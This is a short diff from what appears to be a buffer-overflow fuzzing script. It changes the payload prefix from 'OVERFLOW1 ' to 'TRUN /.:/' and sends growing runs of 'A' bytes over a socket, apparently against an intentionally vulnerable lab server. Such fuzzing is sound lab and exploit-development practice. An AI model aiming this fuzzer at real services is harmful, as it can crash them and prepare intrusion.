@@ -14,7 +14,7 @@ try:
     while True:
         try:
             # Create payload and send
-            payload = b"OVERFLOW1 " + b"A" * A
+            payload = b"TRUN /.:/" + b"A" * A
             s.send(payload)
             print(f"Sent {A} bytes")
             
